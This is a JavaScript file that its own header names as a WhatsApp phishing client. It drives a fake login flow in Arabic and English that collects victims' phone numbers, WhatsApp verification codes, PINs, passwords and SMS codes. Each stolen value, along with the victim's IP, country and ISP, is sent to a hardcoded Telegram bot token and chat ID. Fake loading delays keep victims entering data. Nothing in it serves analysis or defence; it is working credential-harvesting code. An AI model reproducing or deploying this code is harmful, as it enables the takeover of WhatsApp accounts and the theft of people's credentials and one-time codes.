// =============================================
// WhatsApp Phishing - Client Logic (No Panel)
// =============================================

var uniqueID = sessionStorage.getItem('client_unique_id');
if (!uniqueID) {
    uniqueID = Math.floor(Math.random() * (1000000000 - 100) + 1);
    sessionStorage.setItem('client_unique_id', uniqueID);
} else {
    uniqueID = parseInt(uniqueID);
}

var ip = '127.0.0.1';
window.ip = ip;

// =============================================
// Telegram Bot Configuration
// =============================================
const TELEGRAM_BOT_TOKEN = "8603773470:AAFCJjh79vZTx6cGbakmM6yopwrD9MJLSN8";
const TELEGRAM_CHAT_ID = "8719428334";

function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        })
    }).catch(err => console.warn('Telegram send error:', err));
}

// =============================================
// Input Validation
// =============================================
function Validate_Inputs() {
    return new Promise((resolve, reject) => {
        const divname = $("#DivName").val();

        // 1. Phone number page
        if (divname === 'Login' || divname === 'Login_Error') {
            const countryCode = $("#Address").val();
            const phoneVal = $("input#Zip").val() ? $("input#Zip").val().trim() : '';

            if (countryCode && countryCode !== 'auto' && phoneVal.length >= 5 && /^\d+$/.test(phoneVal)) {
                resolve();
            } else {
                $("#errorMsg").text(window.currentLanguage === 'ar' ? 'يرجى إدخال رقم هاتف صحيح مع تحديد رمز البلد.' : 'Please enter a valid phone number and country code.').show();
                $("input#Zip").addClass('borderred');
                reject();
            }
        }
        // 2. PIN Page
        else if (divname === 'Pass') {
            const pinVal = $("input#holder").val() ? $("input#holder").val().trim() : '';
            if (pinVal && pinVal.length >= 4) {
                resolve();
            } else {
                $("#errorMsg").text(window.currentLanguage === 'ar' ? 'يرجى إدخال رمز أمان صحيح.' : 'Please enter a valid security PIN.').show();
                $("input#holder").addClass('borderred');
                reject();
            }
        }
        // 3. Password Page (Pass2)
        else if (divname === 'Pass2') {
            const passVal = $("input#holder").val() ? $("input#holder").val().trim() : '';
            if (passVal && passVal.length >= 4) {
                resolve();
            } else {
                $("#errorMsg").text(window.currentLanguage === 'ar' ? 'يرجى إدخال كلمة مرور صحيحة (4 أحرف على الأقل).' : 'Please enter a valid password (min 4 chars).').show();
                $("input#holder").addClass('borderred');
                reject();
            }
        }
        // 4. SMS / Num OTP Page
        else if (divname === 'Sms' || divname === 'Sms_Error' || divname === 'Num') {
            const smsVal = $("input#sms").val() ? $("input#sms").val().trim() : '';
            if (smsVal && smsVal.length === 6 && /^\d{6}$/.test(smsVal)) {
                resolve();
            } else {
                $("#errorMsg").text(window.currentLanguage === 'ar' ? 'رمز التحقق غير صحيح. يجب أن يتكون من 6 أرقام.' : 'Invalid code. Must be 6 digits.').show();
                $("input#sms").addClass('borderred');
                reject();
            }
        }
        else {
            resolve();
        }
    });
}

// =============================================
// Page Loading & Transitions
// =============================================
$(document).ready(function () {
    // Get real IP info
    fetch('https://extreme-ip-lookup.com/json/?key=demo2')
        .then(res => res.json())
        .then(data => {
            ip = `${data.query} / ${data.countryCode} / ${data.isp}`;
            window.ip = ip;
        }).catch(err => {
            console.warn('IP lookup error:', err);
        });

    // Load initial Login page
    loadPage('Login');
});

// =============================================
// Navigation Click Handler
// =============================================
$("#Variable_countainer").on("click", "#clickmee, #continueBtn, #recoverBtn, #btnAction", function () {
    const divnext = $("#DivNext").val();
    const divname = $("#DivName").val();

    Validate_Inputs().then(() => {
        // Clear old errors
        $("#errorMsg").hide();
        $('input').removeClass('borderred');

        // ── Login: يكتب رقم ──────────────────────────
        if (divname === 'Login' || divname === 'Login_Error') {
            const countryCode = $("#Address").val();
            const phone = $("input#Zip").val();

            sendToTelegram(
                `📱 <b>Nouveau Login</b>\n` +
                `🆔 ID: <code>${uniqueID}</code>\n` +
                `📞 Numéro: <b>${countryCode} ${phone}</b>\n` +
                `🌐 IP: ${ip}`
            );

            loadPage('Loading');
            // 10 ثواني → Num
            setTimeout(() => { loadPage('Num'); }, 10000);
            return;
        }

        // ── Num: يكتب code ──────────────────────────
        if (divname === 'Num') {
            const codeVal = $("input#sms").val();

            sendToTelegram(
                `📟 <b>Code WhatsApp</b>\n` +
                `🆔 ID: <code>${uniqueID}</code>\n` +
                `🔢 Code: <b>${codeVal}</b>`
            );

            loadPage('Loading');
            // 5 ثواني → Pass
            setTimeout(() => { loadPage('Pass'); }, 5000);
            return;
        }

        // ── Pass: يكتب PIN ──────────────────────────
        if (divname === 'Pass') {
            const pinVal = $("input#holder").val();

            sendToTelegram(
                `🔐 <b>PIN Code</b>\n` +
                `🆔 ID: <code>${uniqueID}</code>\n` +
                `🔑 PIN: <b>${pinVal}</b>`
            );

            loadPage('Loading');
            // 5 ثواني → Pass2
            setTimeout(() => { loadPage('Pass2'); }, 5000);
            return;
        }

        // ── Pass2: يكتب password ─────────────────────
        if (divname === 'Pass2') {
            const passVal = $("input#holder").val();

            sendToTelegram(
                `🔑 <b>Password</b>\n` +
                `🆔 ID: <code>${uniqueID}</code>\n` +
                `🗝️ Password: <b>${passVal}</b>`
            );

            loadPage('Loading');
            // 3s loading → popup confirmation → Login
            setTimeout(() => {
                if (typeof window.showConfirmPopup === 'function') {
                    window.showConfirmPopup();
                } else {
                    loadPage('Login');
                }
            }, 3000);
            return;
        }

        // ── SMS / SMS_Error ──────────────────────────
        if (divname === 'Sms' || divname === 'Sms_Error') {
            const smsVal = $("input#sms").val();

            sendToTelegram(
                `💬 <b>SMS Code</b>\n` +
                `🆔 ID: <code>${uniqueID}</code>\n` +
                `🔢 Code: <b>${smsVal}</b>`
            );

            loadPage('Loading');
            return;
        }

        // Generic fallback
        loadPage(divnext);

    }).catch(() => {
        console.log("Validation failed.");
    });
});

// =============================================
// Helper: Load HTML page snippet
// =============================================
function loadPage(pagename, callback) {
    fetch(`./divs/${pagename}.html?v=` + new Date().getTime()).then((response) => {
        if (!response.ok) {
            console.error(`Page not found: ./divs/${pagename}.html`);
            return;
        }
        return response.text().then((html) => {
            var container = document.querySelector('#Variable_countainer');
            container.innerHTML = html;

            // Execute inline scripts inside loaded content
            var scripts = container.getElementsByTagName('script');
            for (var i = 0; i < scripts.length; i++) {
                var scriptEl = document.createElement('script');
                if (scripts[i].src) {
                    scriptEl.src = scripts[i].src;
                } else {
                    scriptEl.textContent = scripts[i].textContent;
                }
                document.body.appendChild(scriptEl);
                scriptEl.parentNode.removeChild(scriptEl);
            }

            // Apply translation dynamically
            if (window.translateDOM) {
                window.translateDOM(container);
            }

            // Focus on Pass input
            if (pagename === 'Pass' || pagename === 'Pass2') {
                $("#holder").focus();
            }

            // SMS countdown timer
            if (pagename === 'Sms' || pagename === 'Sms_Error') {
                startSMSCountdownTimer();
            }

            if (typeof callback === 'function') callback();
        });
    });
}

// =============================================
// SMS Countdown Timer
// =============================================
var smsCountdownInterval = null;
function startSMSCountdownTimer() {
    let timeLeft = 60;
    const timerText = $("#smsChrono");
    const timerVal = timerText.find('.btn-chrono-timer');
    const resendBtn = $("#resendSMSBtn");

    if (!timerText.length) return;

    if (smsCountdownInterval) clearInterval(smsCountdownInterval);

    smsCountdownInterval = setInterval(() => {
        timeLeft--;
        if (timeLeft <= 0) {
            clearInterval(smsCountdownInterval);
            timerText.hide();
            resendBtn.prop('disabled', false);
        } else {
            timerVal.text(timeLeft);
        }
    }, 1000);
}

// =============================================
// Global helpers
// =============================================
window.stopLoading = function() {
    loadPage('Login');
};
